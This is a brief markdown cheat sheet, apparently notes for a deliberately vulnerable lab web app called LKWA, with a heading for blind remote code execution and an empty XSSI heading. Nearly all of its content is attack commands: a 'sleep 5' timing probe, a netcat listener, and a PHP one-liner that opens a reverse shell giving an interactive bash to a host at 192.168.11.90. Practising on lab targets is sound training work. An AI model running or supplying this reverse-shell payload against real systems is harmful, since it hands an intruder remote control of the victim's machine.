# lkwa-cheatsheet

## 0x01 – Blind RCE

try `sleep 5`

### Reverse Shell

- in my macOS Terminal
  - `nc -l 192.168.11.90 8888`
- in the LKWA
  - `php -r '$sock=fsockopen("192.168.11.90",8888);exec("/bin/bash -i <&3 >&3 2>&3");'`

## 0x02 – XSSI

